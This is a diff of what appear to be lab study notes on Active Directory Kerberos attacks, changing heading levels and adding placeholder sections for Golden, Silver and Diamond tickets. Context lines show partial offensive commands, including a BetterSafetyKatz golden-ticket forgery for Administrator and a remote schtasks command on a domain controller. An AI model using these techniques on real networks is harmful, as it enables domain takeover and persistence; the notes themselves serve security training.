@@ -6,7 +6,7 @@
 
 
 
-## **Kerberos**
+# **Kerberos**
 
 - Kerberos is the basis of authentication in a Windows Active Directory environment.
 - Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller.
@@ -18,7 +18,7 @@
 
 
 
-## **Golden Ticket**
+# **Golden Ticket**
 
 
 - A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
@@ -66,9 +66,14 @@ $ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain
 - Using the secrets of krbtgt account, create a golden ticket.
 - Use the Golden ticket to (once again) get domain admin privileges from a machine
 
- 
 
-## **Silver Ticket**
+## **Solution**
+
+
+**_Coming Soon_**
+
+
+# **Silver Ticket**
 
 
 - A valid TGS (Golden ticket is TGT).
@@ -154,5 +159,7 @@ $ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Aut
 
 
 
+
+# **Diamond Ticket**
 
 
